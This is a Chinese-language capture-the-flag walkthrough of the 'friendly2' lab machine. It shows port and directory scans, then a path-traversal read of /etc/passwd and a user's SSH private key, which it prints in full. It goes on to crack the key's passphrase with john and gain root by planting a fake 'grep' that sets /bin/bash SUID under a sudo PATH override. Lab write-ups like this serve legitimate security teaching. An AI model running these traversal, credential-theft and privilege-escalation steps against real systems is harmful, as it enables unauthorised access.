# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.7
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 09:46 EDT
Nmap scan report for 192.168.21.7
Host is up (0.00030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 (RSA)
|   256 16:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 (ECDSA)
|_  256 65:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Servicio de Mantenimiento de Ordenadores
MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.30 ms 192.168.21.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
```

# 漏洞利用

看一下80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <title>Servicio de Mantenimiento de Ordenadores</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <style>
      .header {
        background-color: #343a40;
        color: white;
        padding: 30px;
        text-align: center;
        font-size: 24px;
        margin-bottom: 30px;
      }

      .service {
        padding: 30px;
        margin-bottom: 30px;
      }

      .about-us {
        background-color: #f8f9fa;
        padding: 30px;
        margin-top: 30px;
        text-align: center;
      }
      .warning {
        background-color: #ffcccc;
        color: #cc0000;
        padding: 10px;
        border-radius: 5px;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="header">
      <h1>Servicio de Mantenimiento de Ordenadores</h1>
    </div>

    <div class="container">
      <div class="row">
        <div class="col-md-4">
          <div class="service">
            <h2>Mantenimiento preventivo</h2>
            <p>
              Nuestro servicio de mantenimiento preventivo ayuda a prevenir
              problemas futuros con tu ordenador y garantiza que tu equipo
              funcione de manera óptima.
            </p>
          </div>
        </div>
        <div class="col-md-4">
          <div class="service">
            <h2>Mantenimiento correctivo</h2>
            <p>
              Si tu ordenador tiene un problema, nuestro equipo de técnicos
              altamente capacitados puede resolverlo rápidamente.
            </p>
          </div>
        </div>
        <div class="col-md-4">
          <div class="service">
            <h2>Actualizaciones y reparaciones</h2>
            <p>
              Ofrecemos una amplia gama de servicios de reparación y actualización
              para garantizar que tu ordenador esté siempre actualizado y funcionando
              correctamente.
            </p>
          </div>
        </div>
      </div>
    </div>

    <div class="about-us">
      <h2>¿Quiénes somos?</h2>
      <p>
        Somos una empresa de servicios de tecnología y mantenimiento de ordenadores
        con más de 10 años de experiencia en el mercado. Nuestro equipo de técnicos
        altamente capacitados están disponibles para ayudarte con cualquier problema
        que tengas con tu ordenador.
      </p>
    </div>
    <div class="warning">
      <p>This entire site is CTF. No part of this system is intended to sell any services. This site is also not intended to be publicly published. Nor is it intended to infringe the copyright of any image on the site.</p>
    </div>

  </body>
</html>
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.21.7 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tools                (Status: 301) [Size: 312] [--> http://192.168.21.7/tools/]                                                          
/assets               (Status: 301) [Size: 313] [--> http://192.168.21.7/assets/]                                                         
/server-status        (Status: 403) [Size: 277]
Progress: 1185254 / 1185255 (100.00%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.21.7/tools
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.7/tools
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/documents            (Status: 301) [Size: 322] [--> http://192.168.21.7/tools/documents/]
Progress: 1185254 / 1185255 (100.00%)
===============================================================
Finished
===============================================================
```

/tools

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7/tools/ 
<!DOCTYPE html>
<html>

        <head>
                <meta charset="UTF-8">
                <title>Sistema de herramientas</title>
                <style>
                        h1{text-align: center;}
                </style>
        </head>

        <body>
                <h1 text-align="center"> <img src="/assets/sirena.gif"> INFORMACIÓN PRIVADA <img src="/assets/sirena.gif"> </h1>
                <div>
                        <p> Toda la información de esta página está catalogada con un nivel de confidencialidad 4, esta información no deberá ser envidada ni compartida a ningún agente externo a la empresa.
                </div>

                <div>
                        <h2> To do: </h2>
                        <ul>
                                <li> Añadir imágenes a la web principal. </li>
                                <li> Añadir tema oscuro </li>
                                <li> Traducir la página al inglés / translate the page into English. 😉</li>
                                <!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
                        </ul>
                </div>
        </body>

</html>
```

/tools/documents

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7/tools/documents/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /tools/documents</title>
 </head>
 <body>
<h1>Index of /tools/documents</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/tools/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="keyboard.html">keyboard.html</a></td><td align="right">2023-04-27 15:10  </td><td align="right">1.1K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="laptop.html">laptop.html</a></td><td align="right">2023-04-27 15:12  </td><td align="right">879 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="monitor.html">monitor.html</a></td><td align="right">2023-04-27 15:14  </td><td align="right">841 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.56 (Debian) Server at 192.168.21.7 Port 80</address>
</body></html>
```

看到了提示：Redimensionar la imagen en check_if_exist.php?doc=keyboard.html，查看一下

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7/tools/check_if_exist.php?doc=keyboard.html
<!DOCTYPE html>
<html>
<head>
        <title>Teclado mecánico</title>
        <style>
                body {
                        font-family: Arial, sans-serif;
                        background-color: #f2f2f2;
                }
                h1 {
                        color: #4d4d4d;
                        font-size: 32px;
                        margin-top: 40px;
                        margin-bottom: 20px;
                        text-align: center;
                }
                p {
                        color: #666666;
                        font-size: 20px;
                        margin: 0 20px;
                        text-align: justify;
                }
                .product-image {
                        display: block;
                        margin: 40px auto;
                        max-width: 100%;
                }
                .specs-list {
                        color: #666666;
                        font-size: 20px;
                        margin: 20px;
                }
                .specs-list li {
                        margin-bottom: 10px;
                }
        </style>
</head>
<body>
        <h1>Teclado mecánico</h1>
        <img class="product-image" src="/assets/keyboard.png" alt="Teclado mecánico">
        <p>Este teclado mecánico cuenta con interruptores Cherry MX y retroiluminación RGB para una experiencia de escritura excepcional. Su diseño compacto y su construcción sólida lo convierten en un complemento perfecto para cualquier estación de trabajo.</p>
        <ul class="specs-list">
                <li>Interruptores Cherry MX</li>
                        <li>Retroiluminación RGB</li>
                        <li>Diseño compacto</li>
                        <li>Construcción sólida</li>
                        <li>Conexión USB</li>
        </ul>
</body>
</html>
```

没发现什么，尝试FLI

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7/tools/check_if_exist.php?doc=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
gh0st:x:1001:1001::/home/gh0st:/bin/bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
9tDhjVw3oagRmc3R03zfIwbPINo=
-----END OPENSSH PRIVATE KEY-----
```

保存下来尝试登录

```
┌──(kali㉿kali)-[~]
└─$ ssh gh0st@192.168.21.7 -i id_rsa                             
The authenticity of host '192.168.21.7 (192.168.21.7)' can't be established.
ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.7' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

需要密码，尝试爆破

```
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celtic           (id_rsa)     
1g 0:00:00:03 DONE (2025-09-18 10:13) 0.2777g/s 71.11p/s 71.11c/s 71.11C/s alyssa..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

ssh登录

```
┌──(kali㉿kali)-[~]
└─$ ssh gh0st@192.168.21.7 -i id_rsa                     
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$
```

# 权限提升

寻找可以提权的地方

```
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

提权

```
gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' > grep
//伪造一个恶意的grep
gh0st@friendly2:/tmp$ chmod +x grep
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
Enter the string to encode:
qweqweqwe
The string cannot contain special characters.
//将/tmp写在最前面，当脚本里执行grep时，shell会先在/tmp寻找grep，执行恶意的脚本
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ bash -p
bash-5.1# id
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
bash-5.1# cat /root/root.txt
Not yet! Try to find root.txt.


Hint: ...
bash-5.1# find / -name "..." 2>/dev/null
/...
bash-5.1# cd /.../
bash-5.1# ls -la
total 12
d-wx------  2 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
-r--------  1 root root  100 Apr 29  2023 ebbg.txt
bash-5.1# cat ebbg.txt
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified
需要再次进行root13解码
```
